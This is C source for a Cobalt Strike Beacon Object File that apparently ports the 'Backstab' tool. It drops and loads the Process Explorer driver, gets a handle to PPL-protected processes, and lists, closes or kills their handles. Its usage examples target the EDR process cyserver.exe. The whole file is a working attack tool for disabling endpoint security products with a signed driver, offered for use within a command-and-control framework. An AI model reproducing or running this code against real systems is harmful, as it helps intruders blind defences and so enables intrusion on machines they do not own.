#include "common.h"
#include "Processes.h"
#include "Driverloading.h"
#include "ProcExp.h"
#include "resource.h"
#include "ppl.h"
#include "base.c"
#include "common.c"
#include "Driverloading.c"
#include "ppl.c"
#include "Process.c"
#include "ProcExp.c"
#include "resource.c"

//Main

#define INPUT_ERROR_NONEXISTENT_PID 1
#define INPUT_ERROR_TOO_MANY_PROCESSES 2

void * BeaconDataExtractOrNull(datap* parser, int* size)
{
    char * result = BeaconDataExtract(parser, size);
	if(result[0] == '\0')
		return NULL;
	else
		return result;
}

void * WideBeaconDataExtractOrNull(datap* parser, int* size)
{
   	LPWSTR result = (wchar_t *)BeaconDataExtract(parser, size);
	if(result[0] == '\0')
		return NULL;
	else
		return result;
}

BOOL IsElevated() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation = { 0 };
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return fRet;
}

BOOL SetDebugPrivilege() {
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		return Error("SetDebugPrivilege.OpenProcessToken");
	}

	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	LPWSTR lpwPriv = L"SeDebugPrivilege";

	if (!LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
		CloseHandle(hToken);
		return Error("SetDebugPrivilege.LookupPrivilegeValueW");
	}

	if (!AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		CloseHandle(hToken);
		return Error("SetDebugPrivilege.AdjustTokenPrivileges");
	}

	CloseHandle(hToken);
	return TRUE;
}

BOOL verifyPID(DWORD dwPID) {
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwPID);
	if (hProcess == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	CloseHandle(hProcess);
	return TRUE;
}

int PrintInputError(DWORD dwErrorValue) {

	switch (dwErrorValue)
	{
	case INPUT_ERROR_NONEXISTENT_PID:
		BeaconPrintf(CALLBACK_ERROR, "\n[!] Either PID number or name is incorrect\n");
		break;
	case INPUT_ERROR_TOO_MANY_PROCESSES:
		BeaconPrintf(CALLBACK_ERROR, "\n[!] Either name specified has multiple instances, or you specified a name AND a PID\n");
		break;
	default:
		break;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "\nUsage: backstab.exe <-n name || -p PID> [options]  \n");

	BeaconPrintf(CALLBACK_OUTPUT, "\t-n,\t\tChoose process by name, including the .exe suffix\n");
	BeaconPrintf(CALLBACK_OUTPUT, "\t-p,\t\tChoose process by PID\n");
	BeaconPrintf(CALLBACK_OUTPUT, "\t-l,\t\tList handles of protected process\n");
	BeaconPrintf(CALLBACK_OUTPUT, "\t-k,\t\tKill the protected process by closing its handles\n");
	BeaconPrintf(CALLBACK_OUTPUT, "\t-x,\t\tClose a specific handle\n");
	BeaconPrintf(CALLBACK_OUTPUT, "\t-d,\t\tSpecify path to where ProcExp will be extracted\n");
	BeaconPrintf(CALLBACK_OUTPUT, "\t-s,\t\tSpecify service name registry key\n");
	BeaconPrintf(CALLBACK_OUTPUT, "\t-u,\t\t(attempt to) Unload ProcExp driver\n");
	BeaconPrintf(CALLBACK_OUTPUT, "\t-h,\t\tPrint this menu\n");

	BeaconPrintf(CALLBACK_OUTPUT, "Examples:\n");
	BeaconPrintf(CALLBACK_OUTPUT, "\tbackstab.exe -n cyserver.exe -k\t\t [kill cyserver]\n");
	BeaconPrintf(CALLBACK_OUTPUT, "\tbackstab.exe -n cyserver.exe -x E4C\t\t [Close handle E4C of cyserver]\n");
	BeaconPrintf(CALLBACK_OUTPUT, "\tbackstab.exe -n cyserver.exe -l\t\t[list all handles of cyserver]\n");
	BeaconPrintf(CALLBACK_OUTPUT, "\tbackstab.exe -p 4326 -k -d c:\\\\driver.sys\t\t[kill protected process with PID 4326, extract ProcExp driver to C:\\]\n");


	return -1;
}

int go(IN PCHAR Buffer, IN ULONG Length) {

	//Backstab vars
	LPWSTR szProcessName = NULL;
	DWORD dwPid = 0;
	WCHAR szDriverPath[MAX_PATH] = {0};
	WCHAR szServiceName[MAX_PATH] = L"ProcExp64";
	HANDLE hProtectedProcess, hConnect = NULL;
	LPSTR szHandleToClose = NULL;

	//K4nfr3
	DWORD dwProcessProtectionLevel = 0;
	LPWSTR pwszProcessProtectionName = NULL;

	BOOL
		isUsingProcessName = FALSE,
		isUsingProcessPID = FALSE,
		isUsingDifferentServiceName = FALSE,
		isUsingDifferentDriverPath = FALSE,
		isUsingSpecificHandle = FALSE,
		isRequestingHandleList = FALSE,
		isRequestingProcessKill = FALSE,
		isRequestingDriverUnload = FALSE,
		bRet = FALSE
		;

	//beacon arg vars
	LPSTR argname = NULL;
	LPSTR argpid = NULL;
	short argkillproc = 0;
	short arglisth = 0;
	LPSTR argcloseh = NULL;
	LPWSTR argdriver = NULL;
	LPWSTR argservice = NULL;
	short argunload = 0;

	//Parse Beacon args
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
	argname = BeaconDataExtractOrNull(&parser, NULL);
	argpid = BeaconDataExtractOrNull(&parser, NULL);
	argkillproc = BeaconDataShort(&parser);
	arglisth = BeaconDataShort(&parser);
	argcloseh = BeaconDataExtractOrNull(&parser, NULL);
	argdriver = WideBeaconDataExtractOrNull(&parser, NULL);
	argservice = WideBeaconDataExtractOrNull(&parser, NULL);
	argunload = BeaconDataShort(&parser);

	if (!IsElevated()) {
		BeaconPrintf(CALLBACK_ERROR, "You need elevated privileges to run this tool!\n");
		return -1;
	}
	
	if (!SetDebugPrivilege()) {
		Info("Setting Debug Privilege failed, this might cause access denied (5) error on some hosts");
	}
	
	if (argname != NULL) {
		isUsingProcessName = TRUE;
		bRet = GetProcessPIDFromName(argname, &dwPid);
		if (!bRet)
			return PrintInputError(INPUT_ERROR_NONEXISTENT_PID);
		else
			szProcessName = charToWChar(argname);
	}
	if (argpid != NULL) {
		isUsingProcessPID = TRUE;
		dwPid = atoi(argpid);
		if (!verifyPID(dwPid))
			return PrintInputError(INPUT_ERROR_NONEXISTENT_PID);
	}
	if (argservice != NULL) {
		isUsingDifferentServiceName = TRUE;
		memset(szDriverPath, 0, sizeof(szDriverPath));
		wcscpy(szServiceName, argservice);
	}
	if (argdriver != NULL) {
		isUsingDifferentDriverPath = TRUE;
		memset(szDriverPath, 0, sizeof(szDriverPath));
		wcscpy(szDriverPath, argdriver);
		
	}
	if (argcloseh != NULL) {
		isUsingSpecificHandle = TRUE;
		szHandleToClose = argcloseh;
	}
	if (arglisth != 0) {

		isRequestingHandleList = TRUE;
	}
	if (argkillproc != 0) {
		isRequestingProcessKill = TRUE;
	}
	if (argunload != 0) {
		isRequestingDriverUnload = TRUE;
	}
	
		/* input sanity checks */
	if (!isUsingProcessName && !isUsingProcessPID)
	{
		return PrintInputError(INPUT_ERROR_NONEXISTENT_PID);
	}
	else if (isUsingProcessName && isUsingProcessPID)
	{ 
		return PrintInputError(INPUT_ERROR_TOO_MANY_PROCESSES);
	}
	
	if (!InitializeNecessaryNtAddresses())
	{
		return -1;
	}

	// extracting the driver 
	if (!isUsingDifferentDriverPath)
	{
		 WCHAR cwd[MAX_PATH + 1];
		 Info("no special driver dir specified, extracting to current dir");
		GetCurrentDirectoryW(MAX_PATH + 1, cwd);
		_snwprintf(szDriverPath, _TRUNCATE, L"%ws\\%ws", cwd, L"PROCEXP");
		 WriteResourceToDisk(szDriverPath);
	}
	else {
		//Info("extracting the drive to %ws", szDriverPath);
		WriteResourceToDisk(szDriverPath);
	}

	// driver loading logic 
	if (!LoadDriver(szDriverPath, szServiceName)) {
		if (isRequestingDriverUnload) //sometimes I can't load the driver because it is already loaded, and I want to unload it
		{
			UnloadDriver(szDriverPath, szServiceName);
		}
		return Error("Could not load driver");
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "Driver loaded as %ws\n", szServiceName);
		isRequestingDriverUnload = TRUE;  // Set to unload the driver at the end of the operation

	}

	
	// connect to the loaded driver 
	hConnect = ConnectToProcExpDevice();
	if (hConnect == NULL) {

		UnloadDriver(szDriverPath, szServiceName);
		DeleteResourceFromDisk(szDriverPath);
		return Error("ConnectToProcExpDevice");
	}
	else {
		Success("Connected to Driver successfully");
	}


	// get a handle to the protected process 
	hProtectedProcess = ProcExpOpenProtectedProcess(dwPid, hConnect);
	if (hProtectedProcess == INVALID_HANDLE_VALUE)
	{
		return Error("could not get handle to protected process");
	}


	//printing additional info
	if (isRequestingHandleList || isRequestingProcessKill || isUsingSpecificHandle)
	{
		if (isUsingProcessName) { 
			BeaconPrintf(CALLBACK_OUTPUT, "Process Name: %ws\n", szProcessName);
		}
		
		BeaconPrintf(CALLBACK_OUTPUT, "[*] Process PID: %d\n", dwPid);
		if (!ProcessGetProtectionLevel(dwPid, &dwProcessProtectionLevel))
			BeaconPrintf(CALLBACK_ERROR, "[!] Failed to get the protection level of process with PID %d\n", dwPid);
		else
		{
			ProcessGetProtectionLevelAsString(dwPid, &pwszProcessProtectionName);
			BeaconPrintf(CALLBACK_OUTPUT, "[*] Process Protection level: %d - %ws\n", dwProcessProtectionLevel, pwszProcessProtectionName);
		}
	}

	// perform required operation //
	if (isRequestingHandleList)
	{
		Info("Listing Handles\n");
		ListProcessHandles(hProtectedProcess, hConnect);
	}
	else if (isRequestingProcessKill) {
		Info("Killing process\n");
		KillProcessHandles(hProtectedProcess, hConnect);
		Success("Killing process succeeded");
	}
	else if (isUsingSpecificHandle)
	{
		Info("Closing Handle : 0x%x\n");
		ProcExpKillHandle(dwPid,  strtol(szHandleToClose, 0, 16), hConnect);
		Success("Closing handle succeeded");
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "Please select an operation\n");
	}

	if (isRequestingDriverUnload)
	{
		UnloadDriver(szDriverPath, szServiceName);
		if (!CloseHandle(hConnect))
			BeaconPrintf(CALLBACK_ERROR, "Error ClosingHandle to driver file %p",hConnect);
		DeleteResourceFromDisk(szDriverPath);
	}
	CloseHandle(hConnect); //Close handle opened in ProcExp
	CloseHandle(hProtectedProcess); //Close handle to PPL protected process
	free(szProcessName);
	return 0;
}
